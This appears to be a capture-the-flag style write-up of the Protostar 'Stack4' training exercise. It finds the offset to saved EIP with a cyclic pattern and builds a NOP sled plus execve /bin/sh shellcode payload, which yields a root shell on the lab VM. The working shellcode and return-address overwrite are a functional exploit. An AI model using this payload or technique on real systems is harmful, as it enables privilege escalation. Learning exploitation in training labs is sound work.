{{ Exploit Exercises: Protostar - 0x01 - Stack 4

    [~] {{ Exercise details

        Link : https://exploit-exercises.com/protostar/stack4/

        About:
        Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

        Hints:
            → A variety of introductory papers into buffer overflows may help.
            → gdb lets you do “run < input”
            → EIP is not directly after the end of buffer, compiler padding can also increase the size.

    }}

    [x] {{ Solution

        # Look at the behavior when used as expected
        user@protostar:/opt/protostar/bin$ ./stack4
        fubar

        # Check behavior when overflowed
        user@protostar:/opt/protostar/bin$ python -c 'print "A"*150' | ./stack4
        Segmentation fault

        # Geneerate pattern and find the offset
        > ./pattern.py -c 150
        Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

        user@protostar:~$ echo Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9 > stack4

        (gdb) r < ~/stack4
        Starting program: /opt/protostar/bin/stack4 < ~/stack4

        Program received signal SIGSEGV, Segmentation fault.
        0x63413563 in ?? ()

        > ./pattern.py -ol 63413563
        [+] Offset found at 76 bytes

        # Verify offset
        user@protostar:~$ python -c 'print "A"*76 + "BBBB"' > stack4
        (gdb) r < ~/stack4
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack4 < ~/stack4

        Program received signal SIGSEGV, Segmentation fault.
        0x42424242 in ?? ()
        (gdb) i r eip
        eip            0x42424242   0x42424242

        # Modifying payload to nopsled + shellcode + A*4
        user@protostar:~$ python -c 'print "\x90"*52 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "AAAA"' > stack4

        (gdb) r < ~/stack4
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack4 < ~/stack4

        Program received signal SIGSEGV, Segmentation fault.
        0x41414141 in ?? ()
        (gdb) x/80x $esp-150
        ....
        0xbffff76a: 0xda75bfff  0x9090b7ea  0x90909090  0x90909090
        0xbffff77a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff78a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff79a: 0x90909090  0x90909090  0xec839090  0x580b6a7f
        ....

        # Updating value of EIP
        user@protostar:~$ python -c 'print "\x90"*52 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x7a\xf7\xff\xbf"' > stack4

        # Running the program again inside gdb with the new payload
        (gdb) r < ~/stack4
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack4 < ~/stack4
        Executing new program: /bin/dash

        Program exited normally.

        user@protostar:/tmp$ (cat /home/user/stack4 ; cat) | ./stack4
        whoami
        Floating point exception (core dumped)
        user@protostar:/tmp$ gdb stack4 core.
        core.11.stack0.1841  core.11.stack2.2860  core.11.stack3.3161  core.8.stack4.3763
        core.11.stack1.2546  core.11.stack3.3114  core.11.stack3.3420
        user@protostar:/tmp$ gdb stack4 core.8.stack4.3763 -q
        Reading symbols from /tmp/stack4...done.

        warning: Can't read pathname for load map: Input/output error.
        Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
        (no debugging symbols found)...done.
        Loaded symbols for /lib/libc.so.6
        Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
        (no debugging symbols found)...done.
        Loaded symbols for /lib/ld-linux.so.2
        Core was generated by `./stack4'.
        Program terminated with signal 8, Arithmetic exception.
        #0  0xbffff76d in ?? ()
        (gdb) x/80x $esp-150
        ....
        0xbffff7aa: 0xda75bfff  0x9090b7ea  0x90909090  0x90909090
        0xbffff7ba: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff7ca: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff7da: 0x90909090  0x90909090  0xec839090  0x580b6a7f
        ....
        (gdb) q
        user@protostar:/tmp$ cd /opt/protostar/bin/
        user@protostar:~$ python -c 'print "\x90"*52 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xba\xf7\xff\xbf"' > stack4
        user@protostar:/opt/protostar/bin$ (cat /home/user/stack4 ; cat) | ./stack4
        whoami
        root

    }}


    [~] {{ What did I learn?
    }}

}}